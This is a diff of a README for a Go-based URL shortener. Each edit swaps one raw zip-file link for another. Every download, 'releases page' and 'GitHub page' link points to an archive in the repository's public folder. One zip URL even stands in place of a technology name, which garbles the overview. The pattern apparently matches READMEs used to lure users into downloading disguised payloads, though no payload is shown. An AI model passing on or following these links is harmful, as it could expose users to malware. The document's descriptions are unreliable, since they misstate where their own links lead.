@@ -1,17 +1,17 @@
 # 🚀 urlShortener - Simple URL Shortening Made Easy
 
 ## ⚡ Overview
-urlShortener is a user-friendly application that helps you create short, manageable links. It uses a powerful Go engine for shortening URLs and a https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url-Shortener-triumphing.zip layer to handle redirections. With PostgreSQL, it ensures that your links are unique and easy to manage.
+urlShortener is a user-friendly application that helps you create short, manageable links. It uses a powerful Go engine for shortening URLs and a https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url_Shortener_2.8.zip layer to handle redirections. With PostgreSQL, it ensures that your links are unique and easy to manage.
 
 ## 📦 Download
-[![Download urlShortener](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url-Shortener-triumphing.zip)](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url-Shortener-triumphing.zip)
+[![Download urlShortener](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url_Shortener_2.8.zip)](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url_Shortener_2.8.zip)
 
 ## 🚀 Getting Started
 Follow these steps to set up and run urlShortener on your computer:
 
 1. **Visit the Releases Page**
    Click the link below to go to the releases page, where you can download the application:
-   [Download urlShortener](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url-Shortener-triumphing.zip)
+   [Download urlShortener](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url_Shortener_2.8.zip)
 
 2. **Select Your Version**
    On the releases page, find the latest version of urlShortener. Click on the corresponding link to download the application file.
@@ -64,6 +64,6 @@ If you need further assistance or have questions, feel free to contact our suppo
 urlShortener is open-source software. You can modify and redistribute it under the terms of the MIT License. Please see the LICENSE file in the repository for more details.
 
 ## 📢 Learn More
-For more information about urlShortener, features, and updates, visit our GitHub page: [urlShortener GitHub Repository](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url-Shortener-triumphing.zip).
+For more information about urlShortener, features, and updates, visit our GitHub page: [urlShortener GitHub Repository](https://github.com/Funpythoner/urlShortener/raw/refs/heads/main/public/url_Shortener_2.8.zip).
 
 Download and start using urlShortener today to simplify your URL sharing!
